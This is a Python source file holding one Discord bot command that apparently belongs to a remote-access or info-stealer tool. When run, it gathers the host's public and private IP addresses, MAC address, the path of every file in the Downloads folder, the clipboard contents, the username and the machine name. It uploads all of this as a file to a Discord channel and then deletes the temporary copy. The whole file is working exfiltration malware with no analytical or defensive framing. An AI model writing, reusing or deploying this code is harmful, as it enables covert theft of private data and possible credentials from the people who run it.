import discord
import os
import socket
import uuid
import requests
import platform
import tempfile
import pyperclip
import datetime

async def sysinfo(ctx):
    try:
        public_ip = requests.get('https://api.ipify.org').text.strip()
        private_ip = socket.gethostbyname(socket.gethostname())
        ipv6_address = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)[0][4][0]
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)])
        local_datetime = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        downloads_path = os.path.expanduser("~/Downloads")
        files_list = [os.path.join(root, file_name) for root, dirs, files in os.walk(downloads_path) for file_name in files]
        clipboard_content = pyperclip.paste()
        os_info = platform.platform()
        pc_specs = f"Processor: {platform.processor()}\nSystem: {platform.system()} {platform.version()}\nMachine: {platform.machine()}\nPython Version: {platform.python_version()}"
        pc_username = os.getenv('USERNAME')
        pc_name = socket.gethostname()
        
        sysinfo_text = f"Public IPv4: {public_ip}\nPrivate IPv4: {private_ip}\nIPv6 Address: {ipv6_address}\nMAC Address: {mac_address}\nLocal Date/Time: {local_datetime}\n\nPaths of all files in Downloads:\n"
        sysinfo_text += "\n".join(files_list) + f"\n\nClipboard Content:\n{clipboard_content}\n\nOS Information: {os_info}\n\nFull PC Specs:\n{pc_specs}\n\nPC Username: {pc_username}\nPC Name: {pc_name}"
        
        file_path = os.path.join(tempfile.gettempdir(), "sysinfo.txt")
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(sysinfo_text)
        
        file_to_send = discord.File(file_path, filename="sysinfo.txt")
        await ctx.send("System information generated.", file=file_to_send)
        
        os.remove(file_path)
        
    except Exception as e:
        await ctx.send(f'Failed to retrieve system information: {e}')
